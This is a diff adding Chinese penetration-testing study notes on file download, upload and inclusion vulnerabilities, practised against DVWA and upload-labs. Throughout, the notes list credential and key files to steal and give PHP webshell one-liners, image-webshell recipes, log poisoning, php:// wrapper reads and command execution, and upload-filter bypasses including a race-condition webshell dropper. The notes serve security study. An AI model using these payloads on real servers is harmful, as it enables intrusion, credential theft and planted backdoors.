@@ -1,0 +1,365 @@
+常见可利用文件——
+#Windows：
+C:\boot.ini #查看系统版本
+C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件
+C:\Windows\repair\sam #存储系统初次安装的密码
+C:\Program Files\mysql\my.ini #Mysql配置
+C:\Program Files\mysql\data\\mysql\user.MYD #Mysql root
+C:\Windows\php.ini #php配置信息
+C:\Windows\my.ini #Mysql配置信息
+C:\Windows\win.ini #Windows系统的一个基本系统配置文件
+#Linux：
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts #记录每个访问计算机用户的公钥
+/etc/passwd
+/etc/shadow
+/etc/my.cnf #mysql配置文件
+/etc/httpd/conf/httpd.conf #apache配置文件
+/root/.bash_history #用户历史命令记录文件
+/root/.mysql_history #mysql历史命令记录文件
+/proc/mounts #记录系统挂载设备
+/porc/config.gz #内核配置文件
+/var/lib/mlocate/mlocate.db #全文件路径
+/porc/self/cmdline #当前进程的cmdline参数
+日志默认路径：
+#(1)apache+Linux 日志默认路径
+/etc/httpd/logs/access_log
+/var/log/httpd/access_log
+#(2) apache+win2003 日志默认路径
+D:\xampp\apache\logs\access.log
+D:\xampp\apache\logs\error.log
+#(3) IIS6.0+win2003 默认日志文件
+C:\WINDOWS\system32\Logfiles
+#(4) IIS7.0+win2003 默认日志文件
+%SystemDrive%\inetpub\log\LogFiles
+#(5) nginx 日志文件
+/usr/local/nginx/logs
+/var/log/nginx/access.log
+
+任意文件下载——
+后端在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断,则可能会引发不安全的文件下载漏洞。
+利用条件:
+存在读文件的函数
+读取文件的路径用户可控且未校验或校验不严
+输出了文件内容
+漏洞发现:
+专用搜索引擎
+inurl:"readfile.php?file="
+从链接判断:
+download.php?path=
+从参数判断:
+&Data=
+&path=
+&src=
+&Inputfile=
+&readﬁle=
+&ﬁlepath=
+&RealPath=
+&dis=
+&url=
+&Lang=
+&urls=
+&menu=
+&ﬁlep=
+漏洞验证:
+在找到下载文件的的url后,将url中的文件参数替换为穿越目录,看是否能下载到相应的文件,如果能下载,就有下载漏洞
+?download.php?path=../../
+文件下载漏洞利用思路:
+尝试读取/root/.bash_history看自己是否有root权限
+正常情况下的利用思路
+下载常规的配置文件,例如:ssh,weblogic,ftp,mysql等相关配置
+下载各种.log文件,从中寻找一些后台地址,文件上传点之类的地方。
+下载web业务文件进行白盒审计,利用漏洞进一步攻入服务器。
+当遇到权限问题的时候
+如果具有root权限
+下载/var/lib/mlocate/mlocate.db这个linux文件搜索库,然后利用locate mlocate.db xxname搜索任意文件的具体路径
+这个数据库中含有本地所有文件信息。Linux系统自动创建且每天自动更新一次。
+如果没有root权限
+利用../来回跳转读取一些文件,如.ssh下的配置信息文件,读取mysql下的.bash_history文件。
+来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件
+是下载的时候变得很繁琐,只能尝试去猜解目录,下载一些中间件的记录日志进行分析。
+如我们遇到的是java/jsp+oracle环境,可以先下载/WEB-INF/classes/applicationContext.xml文件,这里面记载的是web服务器的相应配置
+然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译
+搜索文件中的upload关键字看是否存在一些api接口,如果存在的话可以本地构造上传页面用api接口将文件传输进服务器。
+任意文件下载防御
+过滤".",使用户在url中不能回溯上级目录
+正则严格判断用户输入参数的格式（写死路径）
+php.ini配置open_basedir限定文件访问范围
+
+任意文件上传——
+很多网站注册的时候需要上传头像、上传附件等等。
+当用户点击上传按钮后,后端会对上传的文件进行判断,比如是否是指定的类型、后缀名、大小,然后将其按照设计的格式进行重命名后存储在指定的目录。
+如果后端对上传的文件没有进行任何的安全判断或者判断条件不够严谨,则攻击者可能会上传一些恶意的文件,比如一句话木马,从而导致后台服务器被webshell。
+利用条件:
+存在上传点
+可以上传动态文件
+上传目录有执行权限,并且上传的文件可执行
+可访问到上传的动态文件
+上传检测流程:
+1.前端提交	可能遇到JavaScript检测、flash as检测等
+2.数据传输	可能遇到waf拦截、ips拦截等
+3.后端处理	可能遇到扩展名检测、文件格式检测、mime ytpe检测、内容检测等
+4.写入文件系统	可能遇到文件重命名、杀毒软件查杀等
+5.访问文件	可能遇到无执行权限、位置位置等
+客户端检测绕过:
+客户端检测一般只检测文件扩展名，可通过对客户端代码的一些修改或拦截器修改报文即可绕过
+JavaScript检测绕过
+查看onchange、onsubmit等事件
+onchange事件会在与的内容改变时发生,如选择文件
+onsubmit会在确认按钮点击时发生
+删除掉相关事件中的检测函数
+提交报文修改检测
+这种方法在前端绕过中是通用的,无需理会具体前端的检测代码,直接绕过并提交
+将文件名改为符合要求的文件名后上传
+通过bp截包后，进行改包或重放完成文件上传
+APP端bp抓包
+将bp的代理端口监听问“all interface”
+在手机wifi设置中将代理地址设置为bpip:8080
+访问http://bpip:8080下载证书
+安卓将扩展名修改为.crt,然后设置-安装-平局存储-从SD卡安装
+ios直接按提示安装完,进入设置-通用-关于本机-证书信任设置,添加信任
+如果安卓app使用了证书校验,可以配合xposed框架的JustTrustMe使用
+如果使用mumu模拟器,需要用adb打开wifi设置
+adb connect 127.0.0.1:7555
+adb shell am start -a android.settings.WIFI_SETTINGS
+服务器检测绕过:
+mime类型检测绕过
+waf或代码中,可能会检测mime类型,只允许指定的几种mime类型通过
+好在mime类型是浏览器生产的,所以可以通过bp抓包后,修改mime类型来绕过此种检测
+常见的白名单
+image/jepg
+image/png
+text/plain
+application/zip
+application/msword
+简单文件头检测绕过
+文件头是位于文件开头的一段承担一定任务的数据,一般在文件的开头部分,如
+gif的文件头是GIF89a,GIT87a
+jepg的文件头是\xff\xd8\xff（需转码）
+png的文件头是\x89PNG\x0d\x0a（需转码）
+这种检测方法,可以通过在上传的文件前追加合法的文件头进行绕过,如
+GIF89a<?php phpinfo();?>
+完整文件结构检测
+通过调用图像函数（如getimagesize、imagecreatefromgif、imagecreatefrompng等）
+检测文件是否是图像,需要文件内容保持相对完整,所以无法通过加文件头的方法绕过
+针对这种,可以将图片文件与与上传文件合并的方式来绕过检测,合并命令为copy,如
+copy /b a.gif+php.info upload_phpinfo.gif
+恶意文件内容检测
+如果服务器端的waf,会检测提交的内容中是否包含webshell等数据时,前几种方式就都不行
+常见的关键字为
+eval()
+base64_encode()
+assert()
+java.lang.Runtime
+java.lang.ProcessBuilder
+推荐使用强混淆的weevely进行尝试,kali中自带
+https://github.com/sunge/Weevely
+或者尝试开源的webshell收集项目(要自己判断是否挂马)
+https://github.com/tennc/webshell
+一些小技巧
+文件参数多filename属性
+如果waf拦截一些扩展名,可以通过抓包后,写入过个filename属性的方式来尝试绕过
+目录可控时,可以尝试使用目录穿越的方法
+例如文件上传到\A\B\C目录,但是禁止访问该路径下的指定类型文件,那么可以尝试截包,将上传路径改为../../的方式传文件到\A下,如果代码中存在穿越目录的漏洞,就能成功
+扩展名检测类型可控的情况,如
+可以从后台修改允许/禁止的扩展名类型（拿到后台权限）
+提交参数中存在允许/禁止的扩展名类型（改前端页面代码）
+前端单独抽出了文件扩展名进行了提交（截包）
+常见解析漏洞:
+IIS/NGINX+php fastcgi取值错误解析漏洞
+此漏洞属于配置错误,不属于软件漏洞
+php开启了cgi.fix_pathinfo,且未设置security.limit_extensions以限制可以执行的文件类型,那么当执行的文件不存在时,会继续查找上一级文件是否存在,如
+abcde.jpp/.php,找不到,就会向上查找abcde.jpg.php
+nginx文件名逻辑漏洞(CVE-2013-4547)
+影响版本:nginx 0.8.41~14.3/1.5.0~1.5.7
+当上传一个以空格（%20）结尾的文件,如“abcde.jpg ”,然后访问的时候截包,将文件名改为abcde.jpg%20%00.php时,文件会被当做php脚本执行
+apache解析漏洞（配置错误）
+如果在apache的conf文件中有如下配置:当后缀不能解析时,会往前寻找可解析的后缀
+AddHandler application/x-httpd-php .php
+则abcde.php.jpg也会被当做php去执行,所以当我们拿到服务器,想要自己留后门时,可以设置指定的扩展名.xxx
+AddHandler application/x-httpd-php .xxx
+apache路径穿越漏洞（CVE-2021-42013）
+apache2.4.49与50有路径穿越漏洞,构造URL时用双写编码拼凑../即可读取任意文件、执行任意命令
+IIS 5.X/6.0解析漏洞
+分号文件名漏洞
+服务器默认不解析分号后面的内容,因此如果截包上传abcde.asp;.jpg的文件后,再通过浏览器访问改文件,会被当成abcde.asp执行
+xxx.asp目录抖动
+服务器会将xxx.asp目录下的文件,都当做asp文件解析
+高级绕过技巧:
+重绘图绕过
+当应用调用图片库对上传的图像文件进行了图像转换,会使我们合并到图片中的webshell被删掉而失败,针对这种情况的绕过步骤为:
+将正常图片用目标使用的图形库进行转换
+寻找转换前后未变化的部分
+将未变化的部分替换为欲上传的webshell
+将替换后的文件再次转换,看改部分是否仍然存在,然后进行上传
+有一个开源代码可用:
+https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE
+phpinfo与本地文件包含联合使用
+使用场景是可以获取phpinfo,也存在文件包含漏洞,但找不到路径的情况下,可以联合使用
+php在解析multipart/form-data请求时,会创建临时文件,并写入上传内容,当脚本执行结束后就删除
+phpinfo中可以输出$_FILES信息,里面包含临时文件地址
+通过多种方式争取时间,在临时文件删除前进行执行包含
+如大量垃圾数据使phpinfo页面过大,导致php的输出切换为流式输出
+或通过大量请求来延迟php脚本的执行速度
+有开源代码可用:
+https://github.com/hxer/vulnapp.git
+在线解压缩的漏洞利用
+如果某个网站,可以让你上传压缩包,然后网站会将你的压缩包解压的情况,可以如下利用：
+将webshell打包到压缩包中
+模板上传传常用压缩包上传后进行自动解压
+部分网站会检测压缩包中的内容,可以尝试建立目录再进行压缩
+使用目录穿越../的方法向上一级目录进行上传
+将文件/文件夹软连接打包到压缩包中
+如链接到/etc/password文件,或连接到根目录等发生
+
+文件包含漏洞——
+为了更好地使用代码的重用性,引入了文件包含函数,可以通过文件包含函数将文件包含进来,直接使用包含文件的代码。
+所有编程语言中都会提供的功能,但PHP对于包含文件所提供的功能太强大,所以包含漏洞经常出现在PHP语言中,但其他语言也可能出现包含漏洞。
+文件包含漏洞的原理:
+大多数情况下,文件包含函数中包含的代码文件是固定的,因此也不会出现安全问题。
+但有些时候,文件包含的代码文件被写成了一个变量,且这个变量可以由前端用户传进来,这种情况下,如果没有做足够的安全考虑,则可能会引发文件包含漏洞。
+攻击着会指定一个“意想不到”的文件让包含函数去执行,从而造成恶意操作。
+示例代码:
+?page=a.php
+?home=b.html
+?file=content..
+涉及到的危险函数:
+include        #执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
+include_once   #同上，区别是如果该文件中已经被包含过，则不会再次包含。
+require        #程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
+require_once   #同上，区别是 PHP会检查该文件是否已经被包含过，如果是则不会再次包含。
+文件包含漏洞的分类-
+本地文件包含漏洞:
+仅能够对服务器本地的文件进行包含,由于服务器上的文件并不是攻击者所能够控制的,因此该情况下,攻击着更多的会包含一些固定的系统配置文件,从而读取系统敏感信息。
+很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞,从而形成更大的破坏(例如上传webshell后用包含方式调用)。
+远程文件包含漏洞:
+能够通过url地址对远程的文件进行包含,这意味着攻击者可以传入任意的代码
+﻿php远程包含漏洞必要参数
+allow_url_include=on
+magic_quotes_gpc=off
+文件包含漏洞的上传技巧:
+1、小马+图片:
+方法一：直接伪造头部GIF89A
+方法二：CMD方法，copy /b test.png+1.php muma.png
+﻿方法三：直接使用工具往图片中写入一句话木马。
+2、小马+日志:
+当某个PHP文件存在本地包含漏洞,而却无法上传正常文件,这就意味这有包含漏洞却不能拿来利用,这时攻击者就有可能会利用apache日志文件来入侵。
+Apache服务器运行后会生成两个日志文件,access.log(访问日志)和error.log(错误日志),apache的日志文件记录下我们的操作,并且写到访问日志文件access.log之中
+1.打开配置文件`httpd.conf”第299行
+删除井号以取消注释
+##CustomLog "logs/access.log" common
+2.将一句话木马写到url中的fiename里
+虽然会提示失败，但是会记录到日志文件中。
+#URL地址
+http://xx.com/xx.php?filename=<?php @eval($_POST['123']);?>
+#access_log中会有如下内容
+..... GET /xx.php?filename=%3C?PHP%20@eval($_POST[%27123%27]);?%3E ......
+3.然后用包含漏洞包含日志文件
+小马就被运行了,但是由于编码的缘故有可能并不生效,这种时候可以用burp_suite等工具构造发包,不进行编码
+#URL
+http://xx.com/xx.php?filename=../Apache/logs/access.log
+3、利用php包含来读文件：
+构造URL:x.php
+http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php
+通过bp抓包可以发现,返回的包里面有一串base64的加密字符串
+将加密字符串解密，可得一句话木马
+<?php eval($_POST['cmd']);>
+4、php包含写文件：
+只有在allow_url_include为on的时候才可以使用，如果想查看回显结果那还要这样
+在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini
+打开，查找display_funtions=proc-open,oppen,exec,system……
+删掉system,然后重启apache,排除system命令
+#构造URL:
+http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input
+抓包，修改提交的post数据为
+<?php system('net user');?>
+﻿在返回包中,应该能看到net user命令的执行结果
+5、str_replace函数绕过:
+假设设置的过滤../、..\、http://等,以防止目录穿越和远程文件
+1.可以路径嵌套
+http://192.168.0.103/dvwa/vulnerabilities/fi/page=..././..././..././..././..././xampp/htdocs/dvwa/php.ini
+2.绝对路径不受任何影响
+﻿http://192.168.0.103/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini
+3.双写http头使用远程文件
+﻿http://192.168.0.103/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt
+6、fnmatch函数绕过:
+经常会有开发,用fnmatch函数,用于指定只能用特定的文件名开头的文件
+if(!fnmatch("file*",$file)&&$file!="include.php")
+本意是当include.php包含的不是file开头的文件名时,就不能调用
+但有file://协议,也是可以读取文件的
+http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini
+PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。
+File:// 访问本地文件系统
+htt[p:// 访问HTTP(s)网址
+ftp:// 访问FTP(s)URLS
+php:// 访问各个输入/输出流(I/o streams)
+zlib:// 压缩流
+data:// 数据(RFC2397)
+ssh2:// Secure Shell 2
+expect:// 处理交互式的流
+glob:// 查找匹配的文件路径模式
+后端对协议进行限制可以多加尝试另外的协议
+
+upload-labs心得——
+上传文件如果没有向后端发起请求便被禁止——js检查
+如果传到了后端——
+修改MIME
+有两种情况,一种为黑名单,一种为白名单,黑名单通常可以尝试各种不同的方法绕过,如-
+# 修改后缀变成php3、php5、phtml等
+# 上传.htaccess
+.htaccess全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法,即,在一个特定的文档目录中放置一个包含一个或多个指令的文件,以作用于此目录及其所有子目录。
+作为用户,所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess,需要修改httpd.conf,启用AllowOverride,并可以用AllowOverride限制特定命令的使用。
+如果需要使用.htaccess以外的其他文件名,可以用AccessFileName指令来改变。
+笼统地说,.htaccess可以帮我们实现包括:文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表,以及使用其他文件作为index文件等一些功能。
+我们上传一个.htaccess内容如下的文件,它指示这个目录下所有的文件都当做php代码来解析
+SetHandler application/x-httpd-php
+然后上传一个图片马即可成功
+# 上传.user.ini
+user.ini是自PHP5.3.0起,PHP支持基于每个目录的.htaccess风格的INI文件。此类文件仅被CGI／FastCGI SAPI处理。
+此功能使得PECL的htscanner扩展作废。如果使用Apache，则用.htaccess文件有同样效果。
+除了主php.ini之外,PHP还会在每个目录下扫描INI文件,从被执行的PHP文件所在目录开始一直上升到web
+根目录（$_SERVER['DOCUMENT_ROOT']所指定的）。如果被执行的PHP文件在web根目录之外,则只扫描该目录。
+在.user.ini风格的INI文件中只有具有PHP_INI_PERDIR和PHP_INI_USER模式的INI设置可被识别。
+两个新的INI指令,user_ini.filename和user_ini.cache_ttl控制着用户INI文件的使用。
+user_ini.filename设定了PHP会在每个目录下搜寻的文件名;如果设定为空字符串则PHP不会搜寻。默认值是user.ini。
+user_ini.cache_ttl控制着重新读取用户INI文件的间隔时间。默认是 300 秒（5 分钟）。
+引发.user.ini需要服务脚本语言为PHP,使用CGI/FastCGI模式,上传目录下有可执行的php文件
+我们上传一个.user.ini文件,该文件指示所有的php文件都自动包含webshell文件,相当于一个用户自定义的php.ini
+auto_prepend_file=webshell.jpg
+# 重定向绕过
+在windows中,系统无法识别:号之后的文件名,因此我们可以上传webshell.php:.jpg来绕过后端检测,而将文件下载到本地时会将冒号和之后的后缀视为空
+文件内容也视为空。接下来可以结合move_uploaded_file函数的特性利用重定向方法,将上传木马名修改成webshell.<将内容重定向到绕过的文件名中,从而上传webshell
+# 尝试修改后缀大小写绕过
+# 尝试末尾添加空格绕过
+# 尝试后缀加上.或者. .等符号组合绕过
+# 使用后缀::$DATA绕过,::$DATA是windows下的一种特殊文件流标记,如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名,且保持"::$DATA"之前的文件名。
+# 使用双写绕过
+白名单-
+# 如果使用了move_uploaded_file函数移动上传文件,该函数遇到0x00会被截断
+因此如果是前端指示的全局存储路径中加上/upload/webshell.php%00
+文件名写成webshell.jpg绕过检查
+则函数会变成move_uploaded_file($old_path,'../upload/webshell.php%00webshell.jpg')
+该函数遇到%00截断,最后放入目录的是webshell.php文件
+如果是POST发送的save_path则需要在hex中改为00才行
+而move_uploaded_file函数还有一个漏洞,它会忽略掉末尾的/.,因此存储路径构造为/upload/webshell.php/.也能实现相同的结果
+这是低版本的漏洞
+# 图片马
+Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。
+Jpg图片文件包括2字节：FF D8。
+Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。
+Bmp图片文件包括2字节：42 4D。即为 BM。
+使用copy /b image.png+webshell.php webshell.png制作图片马
+然后使用文件包含漏洞读取图片马,如include.php?file=upload/webshell.png
+# 图片马二次渲染,二次渲染会对图片马进行渲染重写,有可能会破坏木马结构,可以找到渲染后的图片里面没有发生变化的hex,进行木马替换包含
+# 时间竞争
+在没有文件包含漏洞可供利用的时候,就只能通过使用php木马当做webshell,如果目标后端的文件逻辑是先保存文件再检测后删除,则有可能出现时间竞争的利用机会
+这是利用代码运行时间的空余,在删除木马之前执行木马。我们可以通过多线程发包webshell,再利用另外一个脚本不同地访问webshell的存储URL
+<?php fputs(fopen('webshell.php','w'),'<?php @eval($_POST['123'])?>');?>
+这个webshell只要执行(被访问)即会在当前目录创建一个webshell.php文件
+然后使用诸如python的requests模块不停地访问地址,只要访问成功(状态码200)可认为木马加载成功
+条件竞争漏洞也可以其他漏洞,诸如文件包含图片马配合使用
+# 数组类型的使用
+在前端可以修改数据包将POST参数设置为数组类型,如果遇到后端逻辑使用explode切割字符串可用此数组绕过切割,使用自定义的数组运行代码
+从而通过检测与拼接形成php木马
